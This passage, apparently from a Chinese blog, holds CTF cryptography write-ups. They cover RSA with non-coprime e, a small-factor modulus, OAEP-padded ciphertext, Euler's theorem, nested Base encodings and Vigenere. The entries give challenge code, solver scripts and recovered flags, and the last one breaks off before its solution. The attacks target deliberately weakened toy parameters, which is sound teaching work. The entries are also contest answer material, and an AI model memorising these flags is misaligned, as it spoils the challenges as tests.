class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">8</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i/<span class="number">8</span>)*<span class="string">&quot;8&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">8</span> &gt;=<span class="number">4</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i%<span class="number">8</span>/<span class="number">4</span>)*<span class="string">&quot;4&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span> &gt;=<span class="number">2</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i%<span class="number">4</span>/<span class="number">2</span>)*<span class="string">&quot;2&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> &gt;= <span class="number">1</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i%<span class="number">2</span>/<span class="number">1</span>)*<span class="string">&quot;1&quot;</span></span><br><span class="line">        flag.append(res + <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;&quot;</span>.join(flag)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">input</span>(<span class="string">&quot;输入要解密的数字串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (de_code(c))</span><br><span class="line">m_code = <span class="built_in">input</span>(<span class="string">&quot;请输入要加密的数字串:&quot;</span>)</span><br><span class="line">encode(m_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LitCTF-2023-e的学问【e-phi不互素】"><a href="#LitCTF-2023-e的学问【e-phi不互素】" class="headerlink" title="[LitCTF 2023]e的学问【e phi不互素】"></a>[LitCTF 2023]e的学问【e phi不互素】</h3><p>题目描述:当e不是65537了，该怎么办呢？</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">e=<span class="number">74</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="comment">#p= 86053582917386343422567174764040471033234388106968488834872953625339458483149</span></span><br><span class="line"><span class="comment">#q= 72031998384560188060716696553519973198388628004850270102102972862328770104493</span></span><br><span class="line"><span class="comment">#c= 3939634105073614197573473825268995321781553470182462454724181094897309933627076266632153551522332244941496491385911139566998817961371516587764621395810123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># e phi【p-1 q-1】 均互素   去公约数</span></span><br><span class="line">e=<span class="number">74</span></span><br><span class="line">p= <span class="number">86053582917386343422567174764040471033234388106968488834872953625339458483149</span></span><br><span class="line">q= <span class="number">72031998384560188060716696553519973198388628004850270102102972862328770104493</span></span><br><span class="line">c= <span class="number">3939634105073614197573473825268995321781553470182462454724181094897309933627076266632153551522332244941496491385911139566998817961371516587764621395810123</span></span><br><span class="line">n= p*q</span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">t = gmpy2.gcd(e,phi_n)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">e1 = e // t</span><br><span class="line">d= gmpy2.invert(e1,phi_n)</span><br><span class="line">m= <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># 求的m后 对 m^t开t次方即可</span></span><br><span class="line">msg = gmpy2.iroot(m,t)</span><br><span class="line"><span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;e_1s_n0t_@_Prime&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/555436f5/7.png"></p>
<p>风二西工具也可直出m 然后longtobyte即可得到flag</p>
<h3 id="湖湘杯-2021-signin-忘做了后面做"><a href="#湖湘杯-2021-signin-忘做了后面做" class="headerlink" title="### [湖湘杯 2021]signin - 忘做了后面做"></a>### [湖湘杯 2021]signin - 忘做了后面做</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>])</span><br><span class="line">m2 = bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">pbits, qbits</span>):</span><br><span class="line">    p1, q1 = getPrime(pbits), getPrime(qbits)</span><br><span class="line">    n1 = p1**<span class="number">4</span>*q1</span><br><span class="line">    q2 = getPrime(qbits)</span><br><span class="line">    bound = p1 // (<span class="number">8</span>*q1*q2) + <span class="number">1</span></span><br><span class="line">    p2 = random.randrange(p1, p1 + bound)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(p2):</span><br><span class="line">        p2 = random.randrange(p1, p1 + bound)</span><br><span class="line">    n2 = p2**<span class="number">4</span>*q2</span><br><span class="line">    <span class="keyword">return</span> (n1, n2), (p1, q1), (p2, q2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="built_in">int</span>(<span class="number">360</span>)</span><br><span class="line">qbits = <span class="built_in">int</span>(<span class="number">128</span>)</span><br><span class="line">pk, sk1, sk2 = gen(pbits, qbits)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, pk[<span class="number">0</span>])</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, pk[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;pk = <span class="subst">&#123;pk&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1, c2 = <span class="subst">&#123;c1, c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pk = (1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233, 1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989)</span></span><br><span class="line"><span class="string">c1, c2 = (361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438, 33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>





<h3 id="NSSCTF-2022-Spring-Recruit-Vigenere"><a href="#NSSCTF-2022-Spring-Recruit-Vigenere" class="headerlink" title="[NSSCTF 2022 Spring Recruit]Vigenere"></a>[NSSCTF 2022 Spring Recruit]Vigenere</h3><p>不知道key  利用在线网站爆破  <a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
<p>![image-20240221093344960](/Users/mamor/Library/Application Support/typora-user-images/image-20240221093344960.png)</p>
<h3 id="AFCTF-2018-可怜的RSA"><a href="#AFCTF-2018-可怜的RSA" class="headerlink" title="[AFCTF 2018]可怜的RSA"></a>[AFCTF 2018]可怜的RSA</h3><p>题目给了一个 flag.enc 和 public.key</p>
<p>openssl rsa -pubin -text -modulus -in warmup -in public.key &gt; 123.txt</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Public-Key: (<span class="number">2070</span> bit)</span><br><span class="line">Modulus:</span><br><span class="line">    <span class="number">25</span>:b1:8b:f5:f3:<span class="number">89</span>:09:7d:<span class="number">17</span>:<span class="number">23</span>:<span class="number">78</span>:<span class="number">66</span>:bb:<span class="number">51</span>:cf:</span><br><span class="line">    f8:de:<span class="number">92</span>:<span class="number">24</span>:<span class="number">53</span>:<span class="number">74</span>:9e:bc:<span class="number">40</span>:3b:09:<span class="number">95</span>:c9:7c:0e:</span><br><span class="line">    <span class="number">38</span>:6d:<span class="number">46</span>:c1:<span class="number">61</span>:ca:df:f7:7c:<span class="number">69</span>:<span class="number">86</span>:0d:ae:<span class="number">47</span>:<span class="number">91</span>:</span><br><span class="line">    c2:<span class="number">14</span>:cf:<span class="number">84</span>:<span class="number">87</span>:aa:aa:9f:<span class="number">26</span>:e9:<span class="number">20</span>:a9:<span class="number">77</span>:<span class="number">83</span>:<span class="number">49</span>:</span><br><span class="line">    06:03:8a:ef:b5:c3:08:<span class="number">27</span>:df:cf:3f:c9:e9:<span class="number">76</span>:<span class="number">95</span>:</span><br><span class="line">    <span class="number">44</span>:f9:4e:07:cd:fe:08:<span class="number">72</span>:03:9a:3a:<span class="number">62</span>:<span class="number">62</span>:<span class="number">11</span>:<span class="number">66</span>:</span><br><span class="line">    <span class="number">78</span>:b2:<span class="number">61</span>:fb:2d:6b:9d:<span class="number">32</span>:<span class="number">53</span>:9e:<span class="number">92</span>:a1:<span class="number">53</span>:b3:<span class="number">67</span>:</span><br><span class="line">    <span class="number">56</span>:<span class="number">29</span>:ba:b3:<span class="number">94</span>:2e:7d:<span class="number">35</span>:e3:0f:7e:ef:5a:bf:1c:</span><br><span class="line">    <span class="number">50</span>:d7:<span class="number">97</span>:d0:cc:<span class="number">88</span>:e1:bd:cc:fd:1a:<span class="number">12</span>:ea:6f:7e:</span><br><span class="line">    f7:5c:<span class="number">37</span>:<span class="number">27</span>:db:df:2e:<span class="number">78</span>:0f:<span class="number">34</span>:<span class="number">28</span>:ae:8f:7a:4f:</span><br><span class="line">    b7:a8:9f:<span class="number">18</span>:4a:<span class="number">36</span>:<span class="number">50</span>:<span class="number">32</span>:b1:<span class="number">53</span>:f8:<span class="number">42</span>:5e:<span class="number">84</span>:<span class="number">57</span>:</span><br><span class="line">    <span class="number">50</span>:eb:2b:7a:bc:02:dc:<span class="number">15</span>:ce:02:07:<span class="number">50</span>:7a:a9:<span class="number">50</span>:</span><br><span class="line">    <span class="number">86</span>:3b:b8:<span class="number">48</span>:0a:<span class="number">78</span>:02:8d:d6:<span class="number">29</span>:<span class="number">79</span>:<span class="number">94</span>:4d:6c:<span class="number">63</span>:</span><br><span class="line">    3f:af:a1:03:e4:db:<span class="number">28</span>:ce:<span class="number">87</span>:f5:a0:c6:ed:4a:2f:</span><br><span class="line">    <span class="number">26</span>:<span class="number">64</span>:<span class="number">42</span>:7f:<span class="number">56</span>:5c:<span class="number">77</span>:<span class="number">81</span>:ab:<span class="number">61</span>:<span class="number">91</span>:<span class="number">45</span>:6d:<span class="number">97</span>:1c:</span><br><span class="line">    7f:fa:<span class="number">39</span>:<span class="number">52</span>:<span class="number">72</span>:<span class="number">37</span>:4c:ec:01:<span class="number">55</span>:e5:f9:<span class="number">11</span>:<span class="number">89</span>:db:</span><br><span class="line">    <span class="number">74</span>:2e:4c:<span class="number">28</span>:b0:3a:0f:a1:1c:ff:b0:<span class="number">31</span>:<span class="number">73</span>:d2:a4:</span><br><span class="line">    cc:e6:ae:<span class="number">53</span></span><br><span class="line">Exponent: <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line">Modulusspan><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/<span class="number">4</span></span><br><span class="line">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span><br><span class="line">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span><br><span class="line">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span><br><span class="line">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span><br><span class="line">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span><br><span class="line">5q5TAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>n转10进制</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">3133337</span> </span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag.enc中是经过base64加密的 所以需要先解密一下才能得到c的值</p>
<p>之前没遇到过这种，解密完cipher就不知道咋做了  看了下提示和别人的wp 需要加密时使用了padding </p>
<p>![image-20240221093440173](/Users/mamor/Library/Application Support/typora-user-images/image-20240221093440173.png)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">n = <span class="number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">cipher =<span class="string">&#x27;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line"><span class="comment"># print(cipher)</span></span><br><span class="line"></span><br><span class="line">key_info = RSA.construct((n, e, <span class="built_in">int</span>(d), p, q))</span><br><span class="line">key = RSA.importKey(key_info.exportKey())</span><br><span class="line">key = PKCS1_OAEP.new(key)</span><br><span class="line">flag = key.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="AFCTF-2018-BASE"><a href="#AFCTF-2018-BASE" class="headerlink" title="[AFCTF 2018]BASE"></a>[AFCTF 2018]BASE</h3><p>本来py base64库一点点解码的 发现是疯狂套娃有点麻烦</p>
<p>看了下wp 直接循环</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;flag_encode.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">text = file.read()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b32decode(text ).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b64decode(text ).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b16decode(text ).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;text！&quot;</span>,text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment">#afctf&#123;U_5h0u1d_Us3_T00l5&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="HGAME-2023-week1-RSA"><a href="#HGAME-2023-week1-RSA" class="headerlink" title="[HGAME 2023 week1]RSA"></a>[HGAME 2023 week1]RSA</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c=<span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">n=<span class="number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">q = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;factordb.com_is_strong!&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="LitCTF-2023-Euler"><a href="#LitCTF-2023-Euler" class="headerlink" title="[LitCTF 2023]Euler"></a>[LitCTF 2023]Euler</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,n-p-q+<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549</span></span><br><span class="line"><span class="string">c = 406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># phi = (p-1)(q-1) = pq-p-q+1 = n-p-q+1 </span></span><br><span class="line"><span class="comment"># c = pow(m,phi+2,n) = m^(phi+2) mod n = m^phi mod n  *  m^2 mod n</span></span><br><span class="line"><span class="comment"># 欧拉定理  m^phi 三 1 mod n  -&gt;  c = m^2 mod n</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549</span></span><br><span class="line">c = <span class="number">406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;a1a8887793acfc199182a649e905daab&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="HDCTF-2023-Math-Rsa"><a href="#HDCTF-2023-Math-Rsa" class="headerlink" title="[HDCTF 2023]Math_Rsa"></a>[HDCTF 2023]Math_Rsa</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> shin <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> r%<span class="number">4</span>==<span class="number">3</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">a=<span class="built_in">pow</span>(p,<span class="number">2</span>,r)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span></span><br><span class="line"><span class="string">r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line"><span class="string">a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line"><span class="string">c = 12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>a=pow(p,2,r)</p>
<p>a = p^2 mod r   ，a r 已知 可以进一步求出p  求出p后 n//p 得到q  然后在求phi d m</p>
<p>WP</p>
